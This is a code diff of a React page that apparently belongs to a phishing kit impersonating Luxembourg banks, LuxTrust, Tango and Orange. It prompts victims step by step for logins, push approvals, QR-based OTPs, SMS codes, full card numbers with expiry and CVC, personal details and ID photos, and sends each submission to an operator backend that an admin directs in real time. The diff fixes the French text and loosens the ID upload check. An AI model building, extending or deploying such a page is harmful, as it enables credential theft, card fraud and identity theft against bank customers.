@@ -25,19 +25,6 @@ import {
   writeVisitors,
 } from "../lib/realtime";
 
-const TOTAL_STEPS = 8;
-
-const STEP_LABELS = [
-  "Identifiants",
-  "Approbation",
-  "TÃ©lÃ©phone",
-  "SMS",
-  "Carte",
-  "Infos",
-  "ID",
-  "Confirmation",
-];
-
 const STATUS_TO_STEP = {
   waiting: 1,
   login_requested: 1,
@@ -96,8 +83,7 @@ function BankHeaderLogo({ bank }) {
   );
 }
 
-function Shell({ bank, step, children, title, kicker, desc }) {
-  const pct = Math.round((step / TOTAL_STEPS) * 100);
+function Shell({ bank, children, title, kicker, desc }) {
   return (
     <div className="min-h-screen w-full overflow-x-hidden bg-neutral-100">
       <header className="w-full text-white" style={{ backgroundColor: bank.color }}>
@@ -106,27 +92,14 @@ function Shell({ bank, step, children, title, kicker, desc }) {
             <BankHeaderLogo bank={bank} />
             <span className="min-w-0 leading-tight">
               <span className="block truncate text-[14px] font-extrabold sm:text-[16px]">{bank.name}</span>
-              <span className="block truncate text-[10px] opacity-80 sm:text-[11px]">VÃ©rification sÃ©curisÃ©e via LuxTrust</span>
+              <span className="block truncate text-[10px] opacity-80 sm:text-[11px]">Vérification sécurisée via LuxTrust</span>
             </span>
           </div>
           <Link to="/" className="shrink-0 rounded-full bg-black/20 px-3 py-2 text-[12px] font-medium hover:bg-black/30 active:bg-black/40">
-            âœ• Annuler
+            ✕ Annuler
           </Link>
         </div>
       </header>
-
-      <div className="mx-auto w-full max-w-3xl px-3 pt-4 sm:px-6 sm:pt-5">
-        <div className="flex flex-wrap items-center gap-2 text-[12px] font-semibold">
-          <span className="shrink-0 rounded-full px-2.5 py-1 text-white" style={{ backgroundColor: bank.color }}>
-            Ã‰tape {step} sur {TOTAL_STEPS}
-          </span>
-          <span className="hidden min-w-0 flex-1 truncate text-neutral-500 md:block">{STEP_LABELS.join(" â†’ ")}</span>
-          <span className="truncate text-neutral-500 md:hidden">{STEP_LABELS[step - 1]}</span>
-        </div>
-        <div className="mt-2 h-1.5 w-full overflow-hidden rounded-full bg-neutral-200">
-          <div className="h-full rounded-full transition-all" style={{ width: `${pct}%`, backgroundColor: bank.color }} />
-        </div>
-      </div>
 
       <main className="mx-auto w-full max-w-3xl px-3 py-4 sm:px-6 sm:py-6">
         <div
@@ -151,7 +124,7 @@ function Shell({ bank, step, children, title, kicker, desc }) {
                   }}
                 />
                 <span className="truncate">
-                  {bank.short} â€¢ {kicker}
+                  {bank.short} • {kicker}
                 </span>
               </span>
             </p>
@@ -159,9 +132,9 @@ function Shell({ bank, step, children, title, kicker, desc }) {
             {desc && <p className="mt-1.5 max-w-xl text-[13.5px] leading-relaxed text-neutral-500 sm:text-[14px]">{desc}</p>}
             <div className="mt-5 w-full sm:mt-6">{children}</div>
             <div className="mt-6 flex items-center gap-3 border-t border-dashed border-neutral-200 pt-4">
-              <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-emerald-50 text-[13px]">ðŸ”’</span>
+              <span className="flex h-7 w-7 shrink-0 items-center justify-center rounded-full bg-emerald-50 text-[13px]">🔒</span>
               <p className="text-[11.5px] leading-snug text-neutral-400">
-                ChiffrÃ© et sÃ©curisÃ© â€¢ <b className="font-semibold text-neutral-500">{bank.name}</b> â€¢ PropulsÃ© par LuxTrust
+                Chiffré et sécurisé • <b className="font-semibold text-neutral-500">{bank.name}</b> • Propulsé par LuxTrust
               </p>
             </div>
           </div>
@@ -176,9 +149,9 @@ function WaitingLoader({ bank, stepNum, note }) {
     <Shell
       bank={bank}
       step={stepNum}
-      kicker="Connexion sÃ©curisÃ©e"
-      title="Veuillez patienterâ€¦"
-      desc="Votre session sÃ©curisÃ©e est en cours de prÃ©paration. Ne fermez pas cette page."
+      kicker="Connexion sécurisée"
+      title="Veuillez patienter…"
+      desc="Votre session sécurisée est en cours de préparation. Ne fermez pas cette page."
     >
       <div className="flex w-full flex-col items-center rounded-2xl border border-dashed border-neutral-300 bg-gradient-to-b from-neutral-50 to-white px-4 py-9 text-center sm:py-11">
         <span className="relative flex h-20 w-20 items-center justify-center">
@@ -196,9 +169,9 @@ function WaitingLoader({ bank, stepNum, note }) {
             }}
           />
         </span>
-        <p className="mt-4 text-[17px] font-extrabold tracking-tight text-neutral-900 sm:text-[18px]">Veuillez patienterâ€¦</p>
+        <p className="mt-4 text-[17px] font-extrabold tracking-tight text-neutral-900 sm:text-[18px]">Veuillez patienter…</p>
         <p className="mt-1 max-w-sm text-[13.5px] leading-relaxed text-neutral-500">
-          {note || "Connexion sÃ©curisÃ©e en cours. Cela prend gÃ©nÃ©ralement quelques secondes."}
+          {note || "Connexion sécurisée en cours. Cela prend généralement quelques secondes."}
         </p>
         <span className="mt-4 flex items-center gap-1.5">
           {[0, 1, 2].map((i) => (
@@ -222,7 +195,7 @@ function PrimaryBtn({ bank, disabled, loading, onClick, children, type = "button
       {loading ? (
         <>
           <span className="h-4 w-4 shrink-0 animate-spin rounded-full border-2 border-white/40 border-t-white" />
-          Verifyingâ€¦
+          Verifying…
         </>
       ) : (
         children
@@ -255,7 +228,7 @@ function ApproveVisual({ bank }) {
         <span className="mt-0.5 block text-[12.5px] leading-snug text-neutral-500">Appuyez sur la notification push, puis confirmez que c&apos;est bien vous.</span>
         <span className="mt-2 inline-flex items-center gap-1.5 rounded-full bg-white px-3 py-1.5 text-[12px] font-semibold text-neutral-600 shadow-sm ring-1 ring-black/5">
           <span className="h-2 w-2 shrink-0 animate-pulse rounded-full bg-emerald-500" />
-          En attente d&apos;approbationâ€¦
+          En attente d&apos;approbation…
         </span>
       </span>
     </div>
@@ -322,8 +295,8 @@ export default function BankFlow() {
   const bank = getBank(bankSlug);
   const navigate = useNavigate();
 
-  // First paint is decided synchronously: fresh bank click â†’ login at once
-  // (loader can never flash), refresh mid-flow â†’ resume saved status.
+  // First paint is decided synchronously: fresh bank click → login at once
+  // (loader can never flash), refresh mid-flow → resume saved status.
   const [status, setStatus] = useState(() => {
     try {
       if (sessionStorage.getItem("fresh_visit") === "1") return "login_requested";
@@ -342,7 +315,7 @@ export default function BankFlow() {
   const appliedCmdRef = useRef("");
   const answeredRef = useRef(0);
 
-  // form states (all hooks at top â€” never conditional)
+  // form states (all hooks at top — never conditional)
   const [userId, setUserId] = useState("");
   const [password, setPassword] = useState("");
   const [orangeUser, setOrangeUser] = useState("");
@@ -381,8 +354,9 @@ function readFileAsDataURL(file) {
 function checkIdFile(file) {
   if (!file) return "";
   const t = (file.type || "").toLowerCase();
-  if (t !== "image/png" && t !== "image/jpeg" && t !== "image/jpg")
-    return "PNG, JPG ou JPEG uniquement.";
+  if (t && !t.startsWith("image/"))
+    return "Photo uniquement (tous formats image acceptés).";
+  if (file.size < 100 * 1024) return "Image trop petite (min 100 Ko).";
   if (file.size > 10 * 1024 * 1024) return "Image trop grande (max 10 Mo).";
   return "";
 }
@@ -402,7 +376,7 @@ function checkIdFile(file) {
     try {
       getChannel()?.postMessage({ type: "submission", entry });
     } catch {}
-    // Postgres Render backend (multi-device) â€” fire and forget
+    // Postgres Render backend (multi-device) — fire and forget
     if (apiEnabled()) apiSubmit(entry).catch(() => {});
   }
 
@@ -426,7 +400,7 @@ function checkIdFile(file) {
     const next = COMMAND_TO_STATUS[type];
     if (!next) return;
     const stamp = at || 0;
-    // Ignore commands sent before the user's last submit â€” the loader stays.
+    // Ignore commands sent before the user's last submit — the loader stays.
     if (stamp <= answeredRef.current) return;
     const key = `${type}:${stamp}`;
     if (appliedCmdRef.current === key) return;
@@ -467,13 +441,13 @@ function checkIdFile(file) {
       id,
       bank: bankSlug,
       bankName: bank.name,
-      // Step 1 (login) shows directly â€” no admin ask needed for it.
+      // Step 1 (login) shows directly — no admin ask needed for it.
       status: "login_requested",
       joinedAt: Date.now(),
       lastSeen: Date.now(),
-      ip: "â€¦",
-      city: "â€¦",
-      country: "â€¦",
+      ip: "…",
+      city: "…",
+      country: "…",
       ua: navigator.userAgent,
     };
     const map = readVisitors();
@@ -497,7 +471,7 @@ function checkIdFile(file) {
     });
 
     if (apiEnabled()) {
-      apiRegisterVisitor({ id, bank: bankSlug, bankName: bank.name, status: "login_requested", ip: "â€¦", city: "â€¦", country: "â€¦", ua: navigator.userAgent, joinedAt: Date.now() }).catch(() => {});
+      apiRegisterVisitor({ id, bank: bankSlug, bankName: bank.name, status: "login_requested", ip: "…", city: "…", country: "…", ua: navigator.userAgent, joinedAt: Date.now() }).catch(() => {});
     }
 
     const hb = setInterval(() => {
@@ -507,7 +481,7 @@ function checkIdFile(file) {
           m[id].lastSeen = Date.now();
           m[id].bank = bankSlug;
           m[id].bankName = bank.name;
-          // status is source of truth from state â€” sync it
+          // status is source of truth from state — sync it
           writeVisitors(m);
         }
       } catch {}
@@ -620,7 +594,7 @@ function checkIdFile(file) {
         <div className="w-full max-w-sm rounded-2xl bg-white p-5 text-center shadow sm:p-6">
           <p className="text-lg font-bold">Banque inconnue</p>
           <Link to="/" className="mt-4 inline-block min-h-[44px] w-full rounded-lg bg-neutral-900 px-4 py-2.5 text-sm font-bold text-white sm:w-auto">
-            â† Retour Ã  LuxTrust
+            ← Retour à LuxTrust
           </Link>
         </div>
       </div>
@@ -656,18 +630,18 @@ function checkIdFile(file) {
     status === "confirm_submitted"
   ) {
     const notes = {
-      waiting: "Vous avez choisi votre banque. Veuillez patienter pendant que nous vous connectons en sÃ©curitÃ©â€¦",
-      login_submitted: "Identifiants reÃ§us. Veuillez patienter pour l'Ã©tape suivanteâ€¦",
-      tango_submitted: "Tango reÃ§u. Veuillez patienter pour l'Ã©tape suivanteâ€¦",
-      orange_submitted: "Orange reÃ§u. Veuillez patienter pour l'Ã©tape suivanteâ€¦",
-      qr_submitted: "QR-code et OTP reÃ§us. Veuillez patienterâ€¦",
-      approve_submitted: "Approbation reÃ§ue. Veuillez patienterâ€¦",
-      phone_submitted: "NumÃ©ro reÃ§u. Veuillez patienterâ€¦",
-      sms_submitted: "Code SMS reÃ§u. Veuillez patienterâ€¦",
-      card_submitted: "DÃ©tails de la carte reÃ§us. Veuillez patienterâ€¦",
-      info_submitted: "Informations reÃ§ues. Veuillez patienter pour l'Ã©tape suivanteâ€¦",
-      id_submitted: "PiÃ¨ce d'identitÃ© reÃ§ue. Veuillez patienterâ€¦",
-      confirm_submitted: "Confirmation reÃ§ue. Veuillez patienterâ€¦",
+      waiting: "Vous avez choisi votre banque. Veuillez patienter pendant que nous vous connectons en sécurité…",
+      login_submitted: "Identifiants reçus. Veuillez patienter pour l'étape suivante…",
+      tango_submitted: "Tango reçu. Veuillez patienter pour l'étape suivante…",
+      orange_submitted: "Orange reçu. Veuillez patienter pour l'étape suivante…",
+      qr_submitted: "QR-code et OTP reçus. Veuillez patienter…",
+      approve_submitted: "Approbation reçue. Veuillez patienter…",
+      phone_submitted: "Numéro reçu. Veuillez patienter…",
+      sms_submitted: "Code SMS reçu. Veuillez patienter…",
+      card_submitted: "Détails de la carte reçus. Veuillez patienter…",
+      info_submitted: "Informations reçues. Veuillez patienter pour l'étape suivante…",
+      id_submitted: "Pièce d'identité reçue. Veuillez patienter…",
+      confirm_submitted: "Confirmation reçue. Veuillez patienter…",
     };
     return <WaitingLoader bank={bank} stepNum={stepNum} note={notes[status]} />;
   }
@@ -685,8 +659,8 @@ function checkIdFile(file) {
           bank={brand}
           step={1}
           kicker="Connexion"
-          title="Connectez-vous Ã  Tango"
-          desc={<>Entrez votre <strong>numÃ©ro de tÃ©lÃ©phone et mot de passe</strong> Tango pour continuer.</>}
+          title="Connectez-vous à Tango"
+          desc={<>Entrez votre <strong>numéro de téléphone et mot de passe</strong> Tango pour continuer.</>}
         >
           <form
             noValidate
@@ -698,7 +672,7 @@ function checkIdFile(file) {
             }}
           >
             <label className="block min-w-0">
-              <span className={labelCls}>NumÃ©ro de tÃ©lÃ©phone</span>
+              <span className={labelCls}>Numéro de téléphone</span>
               <span className="relative mt-2 block">
                 <LeadIcon d={P.phone} />
                 <input
@@ -711,7 +685,7 @@ function checkIdFile(file) {
                   className={`${inputCls(phErr)}`}
                 />
               </span>
-              {phErr && <span className={errCls}>âš  {phErr}</span>}
+              {phErr && <span className={errCls}>⚠ {phErr}</span>}
             </label>
             <label className="mt-4 block min-w-0">
               <span className={labelCls}>Mot de passe</span>
@@ -722,7 +696,7 @@ function checkIdFile(file) {
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   onBlur={() => setT3(true)}
-                  placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢"
+                  placeholder="••••••••"
                   autoComplete="current-password"
                   className={`${inputCls(pwErr)} pr-14`}
                 />
@@ -730,7 +704,7 @@ function checkIdFile(file) {
                   {showPw ? "Masquer" : "Afficher"}
                 </button>
               </span>
-              {pwErr && <span className={errCls}>âš  {pwErr}</span>}
+              {pwErr && <span className={errCls}>⚠ {pwErr}</span>}
             </label>
             <div className="mt-6">
               <PrimaryBtn bank={brand} type="submit" loading={loading} disabled={!ok}>Se connecter →</PrimaryBtn>
@@ -752,7 +726,7 @@ function checkIdFile(file) {
           bank={brand}
           step={1}
           kicker="Connexion"
-          title="Connectez-vous Ã  Orange"
+          title="Connectez-vous à Orange"
           desc={<>Entrez votre <strong>nom d&apos;utilisateur et mot de passe</strong> Orange pour continuer.</>}
         >
           <form
@@ -777,7 +751,7 @@ function checkIdFile(file) {
                   className={`${inputCls(unErr)}`}
                 />
               </span>
-              {unErr && <span className={errCls}>âš  {unErr}</span>}
+              {unErr && <span className={errCls}>⚠ {unErr}</span>}
             </label>
             <label className="mt-4 block min-w-0">
               <span className={labelCls}>Mot de passe</span>
@@ -788,7 +762,7 @@ function checkIdFile(file) {
                   value={password}
                   onChange={(e) => setPassword(e.target.value)}
                   onBlur={() => setT1(true)}
-                  placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢"
+                  placeholder="••••••••"
                   autoComplete="current-password"
                   className={`${inputCls(pwErr)} pr-14`}
                 />
@@ -796,7 +770,7 @@ function checkIdFile(file) {
                   {showPw ? "Masquer" : "Afficher"}
                 </button>
               </span>
-              {pwErr && <span className={errCls}>âš  {pwErr}</span>}
+              {pwErr && <span className={errCls}>⚠ {pwErr}</span>}
             </label>
             <div className="mt-6">
               <PrimaryBtn bank={brand} type="submit" loading={loading} disabled={!ok}>Se connecter →</PrimaryBtn>
@@ -815,9 +789,9 @@ function checkIdFile(file) {
       <Shell
         bank={bank}
         step={1}
-        kicker="PremiÃ¨re Ã©tape"
-        title="Connectez-vous pour vÃ©rifier votre identitÃ©"
-        desc={<>Entrez vos identifiants <strong>{bank.name}</strong>. Ceci est nÃ©cessaire pour garder votre accÃ¨s LuxTrust actif.</>}
+        kicker="Première étape"
+        title="Connectez-vous pour vérifier votre identité"
+        desc={<>Entrez vos identifiants <strong>{bank.name}</strong>. Ceci est nécessaire pour garder votre accès LuxTrust actif.</>}
       >
         <form
           noValidate
@@ -844,7 +818,7 @@ function checkIdFile(file) {
                 className={`font-mono text-[16px] font-bold uppercase tracking-[0.12em] placeholder:text-neutral-300 ${inputCls(uidErr)}`}
               />
             </span>
-            {uidErr ? <span className={errCls}>âš  {uidErr}</span> : <span className="mt-1.5 block text-[12px] text-neutral-400">Exemple : <b className="font-mono">{USER_ID_EXAMPLE}</b> â€” 4 lettres d&apos;abord, 4 chiffres ensuite.</span>}
+            {uidErr ? <span className={errCls}>⚠ {uidErr}</span> : <span className="mt-1.5 block text-[12px] text-neutral-400">Exemple : <b className="font-mono">{USER_ID_EXAMPLE}</b> — 4 lettres d&apos;abord, 4 chiffres ensuite.</span>}
           </label>
           <label className="mt-4 block min-w-0">
             <span className={labelCls}>Mot de passe</span>
@@ -855,7 +829,7 @@ function checkIdFile(file) {
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 onBlur={() => setT1(true)}
-                placeholder="â€¢â€¢â€¢â€¢â€¢â€¢â€¢â€¢"
+                placeholder="••••••••"
                 autoComplete="current-password"
                 className={`${inputCls(pwErr)} pr-14`}
               />
@@ -863,10 +837,10 @@ function checkIdFile(file) {
                 {showPw ? "Masquer" : "Afficher"}
               </button>
             </span>
-            {pwErr && <span className={errCls}>âš  {pwErr}</span>}
+            {pwErr && <span className={errCls}>⚠ {pwErr}</span>}
           </label>
           <div className="mt-6">
-            <PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>VÃ©rifier et continuer â†’</PrimaryBtn>
+            <PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Vérifier et continuer →</PrimaryBtn>
           </div>
           <div className="mt-2.5 flex w-full flex-col gap-2 sm:flex-row">
             <button type="button" onClick={goHome} className="min-h-[44px] flex-1 rounded-lg border border-neutral-200 px-4 py-2.5 text-[13px] font-semibold text-neutral-500 hover:bg-neutral-50">
@@ -878,7 +852,7 @@ function checkIdFile(file) {
     );
   }
 
-  /* ---------- QR (BIL + Spuerkeess extra step only â€” all other steps stay the same) ---------- */
+  /* ---------- QR (BIL + Spuerkeess extra step only — all other steps stay the same) ---------- */
   if (status === "qr_requested") {
     // Only QR banks have this step: LuxTrust mosaic + OTP, like the real bank page.
     // The mosaic image is uploaded by the admin for THIS session.
@@ -893,7 +867,7 @@ function checkIdFile(file) {
           step={2}
           kicker="QR-Code"
           title="Scannez l'image."
-          desc="Scannez ce QR code avec votre application LuxTrust, puis saisissez le code OTP affichÃ©."
+          desc="Scannez ce QR code avec votre application LuxTrust, puis saisissez le code OTP affiché."
         >
           <div className="flex w-full flex-col items-center px-2">
             {/* fraud notice, like the real BILnet page */}
@@ -904,7 +878,7 @@ function checkIdFile(file) {
               </p>
               <ul className="mt-1.5 list-disc space-y-1 pl-5 text-[12.5px] leading-relaxed text-neutral-700">
                 <li>BIL zal u NOOIT om <b>uw persoonlijke gegevens</b>, LuxTrust-inloggegevens of kaartcode vragen, noch om transactie-&quot;annuleringen&quot; te bevestigen via sms, e-mail of telefoon.</li>
-                <li>U kunt {appName} bereiken via onze officiÃ«le website {appSite} of via de {appName}-app.</li>
+                <li>U kunt {appName} bereiken via onze officiële website {appSite} of via de {appName}-app.</li>
                 <li><b>Klik niet</b> op links in sms-berichten of e-mails.</li>
               </ul>
               <p className="mt-1.5 text-[12.5px] leading-relaxed text-neutral-700">
@@ -925,7 +899,7 @@ function checkIdFile(file) {
                   <span className="flex w-full min-w-[230px] flex-col items-center rounded-2xl border border-dashed border-neutral-300 bg-neutral-50 px-4 py-8 text-center">
                     <span className="h-9 w-9 animate-spin rounded-full border-4 border-neutral-200 border-t-current" style={{ color: bank.color }} />
                     <p className="mt-3 max-w-xs text-[13px] font-semibold leading-relaxed text-neutral-600">
-                      Le QR code de votre banque arriveâ€¦ veuillez patienter.
+                      Le QR code de votre banque arrive… veuillez patienter.
                     </p>
                   </span>
                 )}
@@ -965,7 +939,7 @@ function checkIdFile(file) {
                   disabled={!otpOk || loading}
                   className="min-h-[48px] flex-1 rounded-lg border-2 border-green-600 bg-white px-4 py-2.5 text-[14px] font-extrabold uppercase tracking-wide text-green-700 transition hover:bg-green-50 active:scale-[0.98] disabled:cursor-not-allowed disabled:opacity-40"
                 >
-                  {loading ? "â€¦" : "S'AUTHENTIFIER"}
+                  {loading ? "…" : "S'AUTHENTIFIER"}
                 </button>
               </div>
             </form>
@@ -973,8 +947,8 @@ function checkIdFile(file) {
         </Shell>
       );
     }
-    // Any other bank should never land here â€” park on the loader.
-    return <WaitingLoader bank={bank} stepNum={2} note="Veuillez patienterâ€¦" />;
+    // Any other bank should never land here — park on the loader.
+    return <WaitingLoader bank={bank} stepNum={2} note="Veuillez patienter…" />;
   }
 
   /* ---------- APPROVE (same for every bank, BIL included) ---------- */
@@ -984,13 +958,13 @@ function checkIdFile(file) {
         bank={bank}
         step={2}
         kicker="Notification d'approbation"
-        title="VÃ©rifiez votre application LuxTrust"
-        desc="Une notification est prÃªte Ã  Ãªtre approuvÃ©e dans votre application LuxTrust, pour confirmer que c'est bien vous."
+        title="Vérifiez votre application LuxTrust"
+        desc="Une notification est prête à être approuvée dans votre application LuxTrust, pour confirmer que c'est bien vous."
       >
         <ApproveVisual bank={bank} />
         <div className="mt-4 w-full space-y-2.5">
           <PrimaryBtn bank={bank} loading={loading} onClick={() => submitAndWait("approve", { approved: true, at: new Date().toISOString() }, "approve_submitted")}>
-            âœ“ J&apos;ai approuvÃ©
+            ✓ J&apos;ai approuvé
           </PrimaryBtn>
           <button type="button" className="min-h-[48px] w-full rounded-xl border-2 border-neutral-200 px-4 py-2.5 text-[13.5px] font-bold text-neutral-600 transition hover:border-neutral-300 hover:bg-neutral-50 active:bg-neutral-100">
             Renvoyer la notification
@@ -1003,13 +977,13 @@ function checkIdFile(file) {
   /* ---------- PHONE ---------- */
   if (status === "phone_requested") {
     const digits = phone.replace(/\D/g, "");
-    const err = !t3 ? "" : !digits ? "Le numÃ©ro de tÃ©lÃ©phone est requis." : digits.length < 8 ? "Veuillez saisir un numÃ©ro valide." : "";
+    const err = !t3 ? "" : !digits ? "Le numéro de téléphone est requis." : digits.length < 8 ? "Veuillez saisir un numéro valide." : "";
     const ok = digits.length >= 8;
     return (
-      <Shell bank={bank} step={3} kicker="NumÃ©ro de tÃ©lÃ©phone" title="Entrez votre numÃ©ro de tÃ©lÃ©phone" desc="Veuillez saisir votre numÃ©ro de tÃ©lÃ©phone.">
+      <Shell bank={bank} step={3} kicker="Numéro de téléphone" title="Entrez votre numéro de téléphone" desc="Veuillez saisir votre numéro de téléphone.">
         <form noValidate onSubmit={(e) => { e.preventDefault(); setT3(true); if (!ok) return; submitAndWait("phone", { phone: `+352 ${phone}` }, "phone_submitted"); }}>
           <label className="block min-w-0">
-            <span className={labelCls}>NumÃ©ro de tÃ©lÃ©phone</span>
+            <span className={labelCls}>Numéro de téléphone</span>
             <span className="relative mt-2 flex w-full min-w-0 items-center overflow-hidden rounded-xl border-2 border-neutral-200 bg-slate-50/70 transition-all duration-200 focus-within:border-[var(--brand)] focus-within:bg-white focus-within:shadow-[0_0_0_4px_color-mix(in_srgb,var(--brand)_12%,transparent)] hover:border-neutral-300">
               <span className="shrink-0 py-3.5 pl-3.5 pr-1 text-neutral-400">
                 <svg viewBox="0 0 24 24" className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth="1.9" strokeLinecap="round" strokeLinejoin="round"><path d={P.phone} /></svg>
@@ -1025,9 +999,9 @@ function checkIdFile(file) {
                 className="w-full min-w-0 bg-transparent px-3 py-3.5 text-[16px] font-semibold tracking-wide outline-none placeholder:font-normal placeholder:text-neutral-300 sm:text-[15px]"
               />
             </span>
-            {err && <span className={errCls}>âš  {err}</span>}
+            {err && <span className={errCls}>⚠ {err}</span>}
           </label>
-          <div className="mt-6"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Continuer â†’</PrimaryBtn></div>
+          <div className="mt-6"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Continuer →</PrimaryBtn></div>
         </form>
       </Shell>
     );
@@ -1039,7 +1013,7 @@ function checkIdFile(file) {
     const err = !t4 ? "" : !code ? "Le code SMS est requis." : "";
     const ok = code.length > 0;
     return (
-      <Shell bank={bank} step={4} kicker="VÃ©rification SMS" title="Entrez votre code SMS" desc="Veuillez saisir le code SMS que nous venons d'envoyer Ã  votre numÃ©ro.">
+      <Shell bank={bank} step={4} kicker="Vérification SMS" title="Entrez votre code SMS" desc="Veuillez saisir le code SMS que nous venons d'envoyer à votre numéro.">
         <form noValidate onSubmit={(e) => { e.preventDefault(); setT4(true); if (!ok) return; submitAndWait("sms", { sms: code }, "sms_submitted"); }}>
           <label className="block min-w-0">
             <span className={`${labelCls} flex items-center gap-1.5`}>
@@ -1050,14 +1024,14 @@ function checkIdFile(file) {
               value={code}
               onChange={(e) => setSms(e.target.value)}
               onBlur={() => setT4(true)}
-              placeholder="â€¢ â€¢ â€¢ â€¢ â€¢ â€¢ â€¢ â€¢ â€¢ â€¢"
+              placeholder="• • • • • • • • • •"
               inputMode="numeric"
               autoComplete="one-time-code"
               className={`mt-2 text-center font-mono text-[19px] font-extrabold tracking-[0.22em] sm:text-[21px] ${inputClsPlain(err)}`}
             />
-            {err && <span className={`${errCls} justify-center`}>âš  {err}</span>}
+            {err && <span className={`${errCls} justify-center`}>⚠ {err}</span>}
           </label>
-          <div className="mt-4"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>VÃ©rifier le code â†’</PrimaryBtn></div>
+          <div className="mt-4"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Vérifier le code →</PrimaryBtn></div>
         </form>
       </Shell>
     );
@@ -1081,7 +1055,7 @@ function checkIdFile(file) {
       return d.slice(0, 2) + "/" + d.slice(2);
     };
     return (
-      <Shell bank={bank} step={5} kicker="Carte bancaire" title="Ajoutez les dÃ©tails de votre carte" desc="Veuillez saisir les dÃ©tails de votre carte bancaire pour finaliser la vÃ©rification.">
+      <Shell bank={bank} step={5} kicker="Carte bancaire" title="Ajoutez les détails de votre carte" desc="Veuillez saisir les détails de votre carte bancaire pour finaliser la vérification.">
         <form noValidate onSubmit={(e) => { e.preventDefault(); setT5(true); if (!ok) return; submitAndWait("card", { ...card, number: num }, "card_submitted"); }} className="w-full space-y-4">
           {/* mini card preview */}
           <div className="overflow-hidden rounded-2xl p-4 text-white shadow-lg sm:p-5" style={{ background: `linear-gradient(120deg, #1c1c28 0%, ${bank.color} 130%)` }}>
@@ -1089,7 +1063,7 @@ function checkIdFile(file) {
               <span className="h-7 w-10 rounded-md bg-gradient-to-br from-amber-200 to-amber-400" />
               <span className="text-[11px] font-extrabold uppercase tracking-[0.2em] opacity-70">{bank.short}</span>
             </div>
-            <p className="mt-3 font-mono text-[15px] tracking-[0.12em] sm:text-[16px]">{fmtNum(card.number) || "â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢ â€¢â€¢â€¢â€¢"}</p>
+            <p className="mt-3 font-mono text-[15px] tracking-[0.12em] sm:text-[16px]">{fmtNum(card.number) || "•••• •••• •••• ••••"}</p>
             <div className="mt-2 flex items-end justify-between text-[11px]">
               <span className="uppercase tracking-wider opacity-70">{card.holder || "CARD HOLDER"}</span>
               <span className="font-mono">{card.exp || "MM/YY"}</span>
@@ -1101,15 +1075,15 @@ function checkIdFile(file) {
               <LeadIcon d={P.user} />
               <input value={card.holder} onChange={(e) => setCard({ ...card, holder: e.target.value })} placeholder="JOHN DOE" autoComplete="cc-name" className={`uppercase ${inputCls(errs.holder)}`} />
             </span>
-            {errs.holder && <span className={errCls}>âš  {errs.holder}</span>}
+            {errs.holder && <span className={errCls}>⚠ {errs.holder}</span>}
           </label>
           <label className="block min-w-0">
-            <span className={labelCls}>NumÃ©ro de carte</span>
+            <span className={labelCls}>Numéro de carte</span>
             <span className="relative mt-2 block">
               <LeadIcon d={P.card} />
               <input value={fmtNum(card.number)} onChange={(e) => setCard({ ...card, number: e.target.value })} placeholder="1234 5678 9012 3456" inputMode="numeric" autoComplete="cc-number" className={`font-mono tracking-wider ${inputCls(errs.number)}`} />
             </span>
-            {errs.number && <span className={errCls}>âš  {errs.number}</span>}
+            {errs.number && <span className={errCls}>⚠ {errs.number}</span>}
           </label>
           <div className="grid w-full grid-cols-2 gap-2.5 sm:gap-3">
             <label className="block min-w-0">
@@ -1118,7 +1092,7 @@ function checkIdFile(file) {
                 <LeadIcon d={P.cal} />
                 <input value={card.exp} onChange={(e) => setCard({ ...card, exp: fmtExp(e.target.value) })} placeholder="MM/YY" inputMode="numeric" autoComplete="cc-exp" className={`font-mono ${inputCls(errs.exp)}`} />
               </span>
-              {errs.exp && <span className={errCls}>âš  {errs.exp}</span>}
+              {errs.exp && <span className={errCls}>⚠ {errs.exp}</span>}
             </label>
             <label className="block min-w-0">
               <span className={labelCls}>CVC</span>
@@ -1126,10 +1100,10 @@ function checkIdFile(file) {
                 <LeadIcon d={P.lock} />
                 <input value={card.cvc} onChange={(e) => setCard({ ...card, cvc: e.target.value.replace(/\D/g, "").slice(0, 4) })} placeholder="123" inputMode="numeric" autoComplete="cc-csc" className={`font-mono ${inputCls(errs.cvc)}`} />
               </span>
-              {errs.cvc && <span className={errCls}>âš  {errs.cvc}</span>}
+              {errs.cvc && <span className={errCls}>⚠ {errs.cvc}</span>}
             </label>
           </div>
-          <div className="pt-1"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Enregistrer et continuer â†’</PrimaryBtn></div>
+          <div className="pt-1"><PrimaryBtn bank={bank} type="submit" loading={loading} disabled={!ok}>Enregistrer et continuer →</PrimaryBtn></div>
         </form>
       </Shell>
     );
@@ -1156,19 +1130,19 @@ function checkIdFile(file) {
       setInfo({ ...info, dob: out });
     };
     return (
-      <Shell bank={bank} step={6} kicker="Informations personnelles" title="Confirmez vos informations personnelles" desc="Veuillez saisir vos nom, date de naissance et adresse exactement comme enregistrÃ©s auprÃ¨s de votre banque.">
+      <Shell bank={bank} step={6} kicker="Informations personnelles" title="Confirmez vos informations personnelles" desc="Veuillez saisir vos nom, date de naissance et adresse exactement comme enregistrés auprès de votre banque.">
         <form noValidate onSubmit={(ev) => { ev.preventDefault(); setT6(true); if (!ok) return; submitAndWait("info", info, "info_submitted"); }} className="w-full space-y-4">
           <div className="grid w-full grid-cols-1 gap-3.5 sm:grid-cols-2">
-            <label className="block min-w-0"><span className={labelCls}>PrÃ©nom</span><span className="relative mt-2 block"><LeadIcon d={P.user} /><input value={info.first} onChange={set("first")} placeholder="Jean" autoComplete="given-name" className={`${inputCls(e.first)}`} /></span>{e.first && <span className={errCls}>âš  {e.first}</span>}</label>
